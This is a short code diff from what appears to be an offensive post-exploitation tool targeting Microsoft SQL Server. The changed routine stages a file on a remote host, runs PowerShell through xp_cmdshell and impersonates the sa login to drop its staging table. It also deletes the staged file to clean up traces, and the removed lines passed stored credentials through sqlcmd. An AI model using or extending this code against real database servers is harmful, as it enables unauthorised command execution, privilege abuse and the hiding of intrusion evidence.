@@ -187,12 +187,9 @@ class XpMssql:
              else self._build_plain_ps(out_path)
         self.cmd_xpshell_psh(shell, ps)
 
-        # Cleanup — del is a cmd builtin, must go through cmd /c
+        # Cleanup — del is a cmd builtin; DROP TABLE goes direct via _exec_q (avoids nested quote hell)
         shell.cmd_exec_raw(f'cmd /c del /f {remote_sql}')
-        drop_tsql = (f"EXECUTE AS LOGIN='sa';"
-                     f"EXEC xp_cmdshell 'sqlcmd -S {self._host} -U {self._login} "
-                     f"-P {self._password} -C -Q \"DROP TABLE tempdb..stg\"'")
-        self._exec_q(shell, drop_tsql)
+        self._exec_q(shell, "EXECUTE AS LOGIN='sa';IF OBJECT_ID('tempdb..stg','U') IS NOT NULL DROP TABLE tempdb..stg;")
         print(f"[+] xpstage done → {out_path}")
 
     def _build_decrypt_ps(self, key_b64: str, out_path: str) -> str:
